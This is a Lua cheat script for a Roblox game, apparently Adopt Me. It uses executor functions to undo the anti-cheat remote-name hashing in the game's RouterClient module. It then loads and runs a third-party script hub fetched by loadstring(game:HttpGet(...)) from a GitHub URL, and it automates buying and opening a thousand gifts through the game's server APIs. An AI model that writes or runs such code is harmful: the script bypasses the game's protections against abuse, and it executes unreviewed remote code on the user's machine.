
local function rename(remotename, hashedremote)
    hashedremote.Name = remotename
end

local AC_MODULE = game:GetService("ReplicatedStorage").ClientModules.Core.RouterClient.RouterClient

local initFunction = require(AC_MODULE).init
local upvalueTable = getupvalue(initFunction, 7)

if type(upvalueTable) == "table" then
    table.foreach(upvalueTable, rename)
else
print("patch rip")
end
local args = {
	"Parents",
	{
		source_for_logging = "intro_sequence",
		dont_enter_location = true
	}
}
game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TeamAPI/ChooseTeam"):InvokeServer(unpack(args))

loadstring(game:HttpGet(('https://raw.githubusercontent.com/ReQiuYTPL/hub/main/ReQiuYTPLHub.lua'),true))()
task.wait(10)
for i = 1, 1000 do
    local args = {
        "gifts",
        "smallgift",
        {
            buy_count = 1
        }
    }
    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))
end
task.wait(30)
local function open_all_smallgifts()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local API = ReplicatedStorage.API
    local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
    local player = game:GetService("Players").LocalPlayer

    -- Get your inventory and find all small gifts
    local player_inventory = Fsys("ClientData").get("inventory")
    local gifts = player_inventory.gifts

    local found = false
    for _, gift in pairs(gifts) do
        if gift.id == "smallgift" then
            found = true
            local giftId = gift.unique
            print("Opening smallgift with unique ID:", giftId)

            -- Equip the gift (required)
            API["ToolAPI/Equip"]:InvokeServer(
                giftId,
                {use_sound_delay = true, equip_as_last = false}
            )
            task.wait(0.2)

            -- Open the gift
            API["ShopAPI/OpenGift"]:InvokeServer(giftId)
            task.wait(1) -- Wait between gifts to avoid issues
        end
    end

    if not found then
        print("No small gifts found in inventory!")
    end
end

-- Run automatically when the script loads
open_all_smallgifts()
